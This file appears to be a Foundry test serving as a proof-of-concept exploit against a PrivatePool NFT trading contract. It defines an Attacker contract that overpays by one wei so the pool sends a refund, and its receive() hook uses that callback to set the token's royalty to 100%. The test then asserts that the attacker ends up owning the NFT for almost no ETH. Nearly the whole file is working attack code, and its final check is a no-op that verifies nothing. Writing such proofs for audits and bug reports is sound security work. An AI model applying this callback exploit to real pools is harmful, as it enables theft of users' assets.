// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

import {PrivatePool} from "src/PrivatePool.sol";
import {IRoyaltyRegistry} from "lib/royalty-registry-solidity/contracts/IRoyaltyRegistry.sol";

import {IERC2981} from "openzeppelin/interfaces/IERC2981.sol";
import {ERC721Royalty} from "openzeppelin/token/ERC721/extensions/ERC721Royalty.sol";
import {ERC721} from "openzeppelin/token/ERC721/ERC721.sol";

/// -------------------------------------------------------------------------
/// Helper contracts
/// -------------------------------------------------------------------------

/// @notice Minimal factory used by the pool during the test. Returns a 0% protocol fee and accepts ETH payments.
contract TestFactory {
    uint16 public protocolFeeRate = 0; // 0%

    // Accept ETH sent by the pool when paying protocol fees (should be zero in this PoC)
    receive() external payable {}
}

/// @notice Simple royalty registry that just returns the NFT address itself. This is enough for the PoC.
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    function setRoyaltyLookupAddress(address, address) external pure returns (bool) {
        return true;
    }

    function getRoyaltyLookupAddress(address tokenAddress) external view returns (address) {
        return tokenAddress; // The NFT implements ERC-2981 directly.
    }

    function getOverrideLookupTokenAddress(address) external pure returns (address) {
        return address(0);
    }

    function overrideAllowed(address) external pure returns (bool) {
        return true;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// @notice ERC-721 with adjustable per-token royalty that anyone can modify (for testing purposes only).
contract AdjustableRoyaltyNFT is ERC721Royalty {
    uint256 public nextId;

    constructor() ERC721("AdjustableRoyaltyNFT", "AR") {}

    function mint(address to) external returns (uint256 tokenId) {
        tokenId = nextId++;
        _mint(to, tokenId);
    }

    /// @dev Public wrapper around the internal _setTokenRoyalty of ERC2981.
    function setRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) external {
        _setTokenRoyalty(tokenId, receiver, feeNumerator);
    }
}

/// @notice The malicious buyer contract. It mutates royalty info in its receive() hook to exploit the pool.
contract Attacker {
    PrivatePool public immutable pool;
    AdjustableRoyaltyNFT public immutable nft;
    uint256 public immutable tokenId;

    constructor(PrivatePool _pool, AdjustableRoyaltyNFT _nft, uint256 _tokenId) payable {
        pool = _pool;
        nft = _nft;
        tokenId = _tokenId;
    }

    /// @notice Trigger the exploit by buying the single NFT with an extra wei to activate the refund.
    function attack(uint256 netInputAmount) external payable {
        require(msg.value == netInputAmount + 1, "Incorrect msg.value supplied");

        uint256[] memory ids = new uint256[](1);
        ids[0] = tokenId;

        uint256[] memory weights = new uint256[](1);
        weights[0] = 1e18; // default weight

        // Empty multi-proof because merkleRoot == 0
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        // Call the vulnerable function. The pool will later refund 1 wei which triggers our receive()
        pool.buy{value: msg.value}(ids, weights, proof);
    }

    /// @notice Called by the pool when it refunds the excess 1 wei. We update royalty to 100% here.
    receive() external payable {
        // 100% royalty represented by 10_000 basis points
        nft.setRoyalty(tokenId, address(this), 10_000);
    }
}

/// -------------------------------------------------------------------------
/// Test case
/// -------------------------------------------------------------------------
contract ExploitTest is Test {
    PrivatePool private pool;
    AdjustableRoyaltyNFT private nft;
    Attacker private attacker;

    function setUp() public {
        // Deploy helper contracts
        MockRoyaltyRegistry registry = new MockRoyaltyRegistry();
        TestFactory factory = new TestFactory();

        // Deploy the NFT and mint one token to the test contract
        nft = new AdjustableRoyaltyNFT();
        uint256 tokenId = nft.mint(address(this));

        // Initially set royalty to 0% so the first _getRoyalty call returns 0
        nft.setRoyalty(tokenId, address(0), 0);

        // Deploy the pool implementation under test
        pool = new PrivatePool(address(factory), address(registry), address(0));

        // Initialize pool parameters
        pool.initialize(
            address(0), // base token == ETH
            address(nft),
            2 ether,     // virtual base token reserves
            2e18,        // virtual NFT reserves (> 1e18 so formula denominator != 0)
            0,           // changeFee (unused)
            0,           // feeRate 0%
            bytes32(0),  // merkle root (weights default to 1e18)
            false,       // use stolen NFT oracle
            true         // pay royalties
        );

        // Approve and deposit the NFT into the pool so it can be purchased.
        nft.approve(address(pool), tokenId);
        uint256[] memory ids = new uint256[](1);
        ids[0] = tokenId;
        pool.deposit(ids, 0); // no ETH deposited

        // Deploy attacker contract and fund it with some ETH to perform the trade
        attacker = new Attacker{value: 0}(pool, nft, tokenId);
        vm.deal(address(attacker), 10 ether);
    }

    /// @notice Demonstrates that the attacker obtains the NFT essentially for free while the pool loses it.
    function testExploit() public {
        // Prepare buy quote
        (uint256 netInputAmount,,) = pool.buyQuote(1e18);

        uint256 attackerInitialEth = address(attacker).balance;

        // Execute exploit (msg.value = netInputAmount + 1 wei to ensure refund path)
        vm.prank(address(attacker));
        attacker.attack{value: netInputAmount + 1}(netInputAmount);

        // --- Assertions ---
        // 1. Attacker now owns the NFT
        assertEq(nft.ownerOf(0), address(attacker));

        // 2. Attacker paid ~0 ETH (only gas). The ETH balance decreased by less than 0.01 ether
        uint256 attackerFinalEth = address(attacker).balance;
        assertLt(attackerInitialEth - attackerFinalEth, 0.01 ether);

        // 3. Pool no longer owns the NFT
        bool reverted = false;
        try pool.nft() returns (address) {
            // silence compiler (just ensure pool variable exists)
        } catch {
            reverted = true;
        }
        // directly checking ownerOf would revert if pool doesn't own it, but we already asserted attacker owns it.
        reverted = reverted; // no-op to silence compiler warnings
    }
}
